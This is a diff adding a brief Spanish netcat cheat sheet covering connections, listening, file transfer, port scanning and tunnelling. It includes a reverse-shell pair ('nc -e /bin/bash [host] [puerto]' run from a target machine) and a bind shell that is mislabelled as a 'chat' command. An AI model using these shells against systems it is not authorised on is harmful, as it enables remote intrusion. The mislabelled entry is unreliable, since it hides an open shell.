@@ -1,0 +1,56 @@
+Netcat es una herramienta de línea de comandos que se utiliza para la transferencia de datos a través de redes de computadoras. Su función principal es la de crear conexiones de red, escuchar en puertos y transferir datos entre sistemas.
+
+
+Quedar a la escucha:
+nc -lnvp  +numero puerto
+
+
+Crear una conexion TCP:
+nc -v [host] [puerto]
+
+Escuchar en un puerto TCP :
+nc -l -p [puerto]
+
+Conexion UDP:
+nc -u -v [host] [puerto]
+
+Escuchar en un puerto UDP :
+nc -u -l -p [puerto]
+
+Transferir archivos:
+nc -w 3 [host] [puerto] < archivo a enviar 
+
+Recibir archivos:
+nc -l -p [puerto] > archivo recibido 
+
+Conexion inversa Reverse Shell:
+En la maquina atacante(escuchando)
+nc -l -p [puerto]
+
+En la maquina objetivo(conectandose)
+nc -e /bin/bash [host] [puerto]
+
+Tunel a traves de un Proxy:
+nc -X 5 -x [proxy_host] : [proxy_port] [host] [puerto]
+
+Escuchar en un puerto y ejecutar un comando en la conexion: 
+nc -l -p [puerto] -e [comando_a_ejecutar]
+
+Chat en linea de comandos:
+nc -l -p [puerto] -e /bin/bash 
+
+Conexion con tarjeta de visita (banner grabber):
+nc -v [host] [puerto]
+
+Escaneo de puertos:
+nc -zv [host] [puerto_inicio] [puerto_fin]
+
+Obtener informacion sobre el sistema remoto(finger banner) 
+nc -nv [host] [puerto]	
+
+Transferencia de archivos a traves de un tunel SSH:
+en la maquina de destino (escuchando):
+nc -l -p [puerto] | tar xvzf - 
+
+en la maquina de origen (conectandose a traves de SSH):
+tar czf - /carpeta/a/enviar |ssh  [usuario]@[host] nc [host_destino] [puerto] 
